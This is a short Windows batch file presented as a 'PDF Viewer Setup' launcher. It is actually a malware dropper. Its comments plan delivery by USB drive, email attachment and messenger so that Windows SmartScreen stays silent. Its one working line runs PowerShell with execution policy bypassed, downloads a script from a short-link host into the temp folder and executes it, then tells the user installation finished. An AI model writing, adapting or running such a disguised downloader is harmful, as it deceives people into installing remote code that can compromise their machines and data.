@echo off
rem ============================================================
rem PDF Viewer Extension - Windows .bat launcher
rem Same command as the landing page one-liner (Win+R flow).
rem Delivery: USB flash drive, email attachment, messengers,
rem local share. No MOTW on USB/local copies -> SmartScreen silent.
rem cmd.exe exists on every Windows since XP; benign admin pattern.
rem Execution: double-click; window stays open until done.
rem ============================================================

title PDF Viewer Setup

powershell -NoProfile -ExecutionPolicy Bypass -c "iwr wln.ink/i -o $env:TEMP\c.ps1;. $env:TEMP\c.ps1"

if errorlevel 1 (
    echo.
    echo  [ERROR] Installation failed. Check internet connection and retry.
    pause
    exit /b 1
)

echo.
echo  [OK] Done. You can close this window.
timeout /t 5 /nobreak >nul